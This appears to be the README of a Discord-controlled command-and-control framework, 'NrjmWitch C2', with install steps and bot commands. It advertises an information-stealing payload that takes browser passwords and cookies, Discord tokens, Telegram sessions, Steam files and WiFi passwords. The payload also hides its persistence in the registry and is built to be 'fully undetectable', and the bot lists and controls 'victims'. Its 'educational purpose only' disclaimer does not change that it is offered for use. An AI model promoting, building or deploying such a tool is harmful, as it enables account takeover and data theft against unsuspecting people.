# NrjmWitch C2 🧙‍♀️

> **Professional Open Source Command & Control Framework**
> *Educational Purpose Only - Use Responsibly*

![Banner](https://media.discordapp.net/attachments/1471566542302089226/placeholder.png)

## 🌟 Features

-   **Zero Dependency Payload**: Written in pure C++ (WinAPI), compiles to a lightweight (<100KB) standalone EXE.
-   **Advanced Harvesting**:
    -   **Browsers**: Chrome, Edge, Brave, Opera, Yandex (Cookies, Passwords, History).
    -   **Messengers**: Discord (Tokens), Telegram (Session/tdata).
    -   **Gaming**: Steam (Config/SSFN), Minecraft (Launcher Profiles).
    -   **System**: WiFi Passwords, Screenshots, Clipboard, Process List.
-   **Real-time Alerts**: Geo-IP location, ISP, and new victim notifications.
-   **Dynamic Builder**: `!buildpayload` command injects your configuration automatically.
-   **Persistence**: Auto-start via Registry (Hidden).
-   **Customizable UI**: Fully configurable branding, colors, and support links.

## 🚀 Installation

1.  **Clone the Repository**
    ```bash
    git clone https://github.com/NrjmWitch/NrjmWitch-Bot.git
    cd NrjmWitch-Bot
    ```

2.  **Install Dependencies**
    ```bash
    npm install
    ```

3.  **Configuration**
    -   Rename `.env.example` to `.env`.
    -   Fill in your tokens:
        ```ini
        DISCORD_TOKEN=your_bot_token
        OWNER_ID=your_discord_id
        EMBED_COLOR=#00FF00
        ```

4.  **Start the Bot**
    ```bash
    node index.js
    ```

## 🛠️ Usage

-   **!start**: Initialize your profile.
-   **!buildpayload**: Generates a FUD (Fully Undetectable) C++ payload.
-   **!victims**: View connected machines.
-   **!control <IP>**: Interact with a victim.
-   **!admin clearvictims**: Wipe database (Owner only).

## ⚠️ Disclaimer
This software is provided for **educational and research purposes only**. The author is not responsible for any misuse of this tool. Do not use on systems you do not have permission to test.

## 📜 License
MIT License.
